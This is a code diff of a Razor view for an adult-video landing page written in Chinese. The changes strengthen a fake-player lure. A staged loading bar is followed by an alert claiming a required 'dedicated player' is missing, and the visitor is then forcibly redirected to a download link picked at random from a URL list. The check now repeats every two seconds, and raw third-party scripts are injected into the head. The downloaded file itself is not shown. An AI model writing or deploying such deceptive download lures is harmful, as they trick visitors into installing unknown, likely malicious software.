@@ -8,6 +8,7 @@
     var img4 = ViewBag.Img4 + ".jpg";
     var img5 = ViewBag.Img5 + ".jpg";
     var imgUrl = "http://f1.freep.cn/551893/sex/";
+    var r = new Random();
 }
 
 <!DOCTYPE html>
@@ -18,37 +19,44 @@
     <meta name=viewport content='width=device-width,initial-scale=1,user-scalable=no'>
     <link href="~/Css/1.css" rel="stylesheet" />
     <meta name=GENERATOR content="MSHTML 8.00.6001.18702">
-    @Html.Raw(Model.Cnzz)
+    @foreach (var item in Model.Cnzz)
+    {
+        @Html.Raw(item)
+    }
+    
 </head>
 <body>
     <div class=top data-role="header">
         <div class=kb_dh>
             <ul>
                 <li class=xz data-cid="0">
-                    @Html.ActionLink("首页", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                    <a href="@Model.Url[r.Next(0, Model.Url.Length)]">首页</a>
                 </li>
                 <li data-cid="1">
-                    @Html.ActionLink("日本", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                    <a href="@Model.Url[r.Next(0, Model.Url.Length)]">日本</a>
                 </li>
                 <li data-cid="2">
-                    @Html.ActionLink("韩国", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                    <a href="@Model.Url[r.Next(0, Model.Url.Length)]">韩国</a>
                 </li>
                 <li data-cid="3">
-                    @Html.ActionLink("欧美", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                    <a href="@Model.Url[r.Next(0, Model.Url.Length)]">欧美</a>
                 </li>
                 <li data-cid="4">
-                    @Html.ActionLink("自拍", "Down", new { uid = Model.Uid, pid = Model.Pid, url = Model.Url })
+                    <a href="@Model.Url[r.Next(0, Model.Url.Length)]">自拍</a>
                 </li>
             </ul>
         </div>
     </div>
-    <input type="hidden" id="url" value="@Model.Url" />
+    @foreach (var item in Model.Url)
+    {
+        <input type="hidden" class="url" value="@item" />
+    }
+    
     <div id=vod class=kb_yd data-role="page">
         <div data-role="content">
             <div class=n_top>
                 <div class=n_title>
                     <p align="center" style="DISPLAY: none" id=ok name=loading>
-                        <script>document.writeln("<a href=" + down('v') + ">")</script>
                         <font size="3" color="#00FF00">没安装播放器</font><font size="3" color="#FFFFFFF">无法播放,点击下载<font color="#00FF00">专用播放器</font></font>
                 </div>
             </div>
@@ -71,7 +79,9 @@
                     var bar = 0
                     var line = "||"
                     var amount = "||"
-                    count()
+                    var urls = document.getElementsByClassName('url');
+                    //count()
+                    setInterval(count, 2000);
                     function count() {
                         isLoading.style.display = "none";		//隐藏层 [加载进度]
                         bar = bar + 4
@@ -82,16 +92,15 @@
                             setTimeout("count()", 70);
                         }
                         else {
+                            
                             alert('没有检测到本站专用播放器,请下载本站专用播放器，安装后运行即可观看本站2W部成人爽片！');
-                            ok.style.display = "block";
-                            var url = document.getElementById('url').value;
-                            //alert(url);
-                            window.location.href = url;
+                            ok.style.display = "block";                           
+                            window.location.href = urls[parseInt(Math.random() * urls.length)].value;
                         }
                     }
                 </script>
 
-                <a href="@Model.Url"><img src="@Path.Combine(imgUrl,topImg)" /></a>
+                <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,topImg)" /></a>
 
             </div>
         </div>
@@ -104,12 +113,9 @@
                     <li>
                         <div class=L1>
                             <span class=pc_wz>超爽片</span><span class=pc_bg></span>
-                            <a href="@Model.Url"><img src="@Path.Combine(imgUrl,img2)" /></a>
+                            <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,img2)" /></a>
                         </div>
                         <div class=R1>
-                            <p class=dazi>
-                                <script>document.writeln(a2[0])</script>
-                            </p>
                             <p>类型：高清</p><p>地区：日韩电影</p>
                             <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
                         </div>
@@ -118,12 +124,9 @@
                     <li>
                         <div class=L1>
                             <span class=pc_wz>超爽片</span><span class=pc_bg></span>
-                            <a href="@Model.Url"><img src="@Path.Combine(imgUrl,img3)" /></a>
+                            <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,img3)" /></a>
                         </div>
                         <div class=R1>
-                            <p class=dazi>
-                                <script>document.writeln(a2[1])</script>
-                            </p>
                             <p>类型：高清</p><p>地区：日韩电影</p>
                             <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
                         </div>
@@ -132,12 +135,9 @@
                     <li>
                         <div class=L1>
                             <span class=pc_wz>超爽片</span><span class=pc_bg></span>
-                            <a href="@Model.Url"><img src="@Path.Combine(imgUrl,img4)" /></a>
+                            <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,img4)" /></a>
                         </div>
                         <div class=R1>
-                            <p class=dazi>
-                                <script>document.writeln(a2[2])</script>
-                            </p>
                             <p>类型：高清</p><p>地区：日韩电影</p>
                             <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
                         </div>
@@ -146,12 +146,9 @@
                     <li>
                         <div class=L1>
                             <span class=pc_wz>超爽片</span><span class=pc_bg></span>
-                            <a href="@Model.Url"><img src="@Path.Combine(imgUrl,img5)" /></a>
+                            <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,img5)" /></a>
                         </div>
                         <div class=R1>
-                            <p class=dazi>
-                                <script>document.writeln(a2[3])</script>
-                            </p>
                             <p>类型：高清</p><p>地区：日韩电影</p>
                             <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
                         </div>
@@ -160,12 +157,9 @@
                     <li>
                         <div class=L1>
                             <span class=pc_wz>超爽片</span><span class=pc_bg></span>
-                            <a href="@Model.Url"><img src="@Path.Combine(imgUrl,img1)" /></a>
+                            <a href="@Model.Url[r.Next(0, Model.Url.Length)]"><img src="@Path.Combine(imgUrl,img1)" /></a>
                         </div>
                         <div class=R1>
-                            <p class=dazi>
-                                <script>document.writeln(a2[4])</script>
-                            </p>
                             <p>类型：高清</p><p>地区：日韩电影</p>
                             <p>评分：<span class=star_1></span><span class=h_sz>10.0</span></p>
                         </div>
